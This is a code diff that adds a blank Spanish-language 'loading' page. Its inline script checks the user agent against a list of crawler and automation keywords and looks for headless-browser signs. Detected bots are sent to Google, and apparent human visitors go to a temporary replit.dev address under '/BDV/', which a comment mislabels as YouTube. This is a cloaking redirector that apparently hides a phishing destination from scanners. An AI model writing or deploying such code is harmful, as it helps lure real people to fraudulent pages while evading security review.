@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Cargando...</title>
+    <script>
+    (function() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        
+        // 1. Lista de palabras clave de bots y rastreadores comunes
+        const botsKeywords = [
+            'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
+            'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver', 
+            'semrushbot', 'ahrefsbot', 'mj12bot', 'petalbot', 'bytespider',
+            'spider', 'crawler', 'robot', 'fetch', 'headless', 'python', 'curl'
+        ];
+
+        // Comprobar si el navegador coincide con un bot por el User-Agent
+        const esBotPorUserAgent = botsKeywords.some(bot => userAgent.includes(bot));
+
+        // 2. Detección de automatización básica (navegadores fantasma o controlados por código)
+        const esBotPorNavegador = (
+            navigator.webdriver === true || 
+            window._phantom || 
+            window.__nightmare || 
+            window.callPhantom ||
+            navigator.languages === "" ||
+            !navigator.languages
+        );
+
+        // 3. Redirección según el resultado
+        if (esBotPorUserAgent || esBotPorNavegador) {
+            // Si es un bot -> Redirigir a Google
+            window.location.replace("https://www.google.com");
+        } else {
+            // Si es una persona real -> Redirigir a YouTube
+            window.location.replace("https://2fbe7dd2-65ee-401a-ae29-3128e212fb6e-00-2w844qmolewae.picard.replit.dev/BDV/");
+        }
+    })();
+    </script>
+</head>
+<body>
+    <!-- Cuerpo vacío o con un mensaje de carga opcional -->
+</body>
+</html>
